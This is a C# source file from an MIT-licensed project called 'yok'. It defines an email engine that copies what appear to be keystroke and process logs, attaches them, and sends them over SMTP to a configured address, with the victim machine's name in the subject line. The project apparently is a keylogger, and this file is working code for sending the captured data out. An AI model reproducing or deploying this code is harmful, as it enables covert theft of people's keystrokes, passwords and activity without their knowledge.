// Yok 
// https://github.com/erickjung/yok
//
// Copyright (c) 2012-2015 Erick Jung
//
// This code is distributed under the terms and conditions of the MIT license.
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in
// all copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
// THE SOFTWARE.

using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Text;
using log4net;
using yok.Util;

namespace yok.App.Engine
{
    /// <summary>
    ///     The email engine
    /// </summary>
    internal class EmailEngine
    {
        private static readonly ILog Logger = LogManager.GetLogger(typeof (EmailEngine));

        /// <summary>
        ///     Send through email all the log data
        /// </summary>
        /// <returns>True if everything is ok</returns>
        public static bool Send()
        {
            Logger.Info("Starting sending email");

            var ret = false;

            SmtpClient smtpServer = null;
            MailMessage mail = null;

            try
            {
                var emailLogin = Config.GetStringValue(Globals.YokXmlEmaillogin);
                var emailPwd = Config.GetStringValue(Globals.YokXmlEmailpwd);
                var emailPort = Convert.ToInt32(Config.GetStringValue(Globals.YokXmlEmailsmtpport));
                var emailHost = Config.GetStringValue(Globals.YokXmlEmailsmtp);
                var emailTo = Config.GetStringValue(Globals.YokXmlEmailto);

                smtpServer = new SmtpClient
                {
                    Credentials = new NetworkCredential(emailLogin, emailPwd),
                    Port = emailPort,
                    Host = emailHost,
                    EnableSsl = Config.GetBoolValue(Globals.YokXmlEmailssl)
                };


                mail = new MailMessage
                {
                    From = new MailAddress(emailLogin,
                        "yok",
                        Encoding.UTF8)
                };

                mail.To.Add(emailTo);

                mail.Subject = Config.GetStringValue(Globals.YokXmlEmailsubject) + " (" + Environment.MachineName +
                               " - " + DateTime.Now + ")";
                mail.Body = Config.GetStringValue(Globals.YokXmlEmailmsg);

                try
                {
                    File.Copy(Logs.LogProc, Logs.LogProcBackup);
                    mail.Attachments.Add(new Attachment(Logs.LogProcBackup));
                }
                catch (Exception ex)
                {
                    Logger.Error(ex);
                }

                try
                {
                    File.Copy(Logs.LogKey, Logs.LogKeyBackup);
                    mail.Attachments.Add(new Attachment(Logs.LogKeyBackup));
                }
                catch (Exception ex)
                {
                    Logger.Error(ex);
                }

                smtpServer.Send(mail);

                Logger.Info("+++ Email Sent at: " + DateTime.Now);

                ret = true;
            }
            catch (Exception ex)
            {
                Logger.Error(ex);
            }
            finally
            {
                if (smtpServer != null)
                {
                    smtpServer.Dispose();
                }

                if (mail != null)
                {
                    mail.Dispose();
                }
            }

            return ret;
        }
    }
}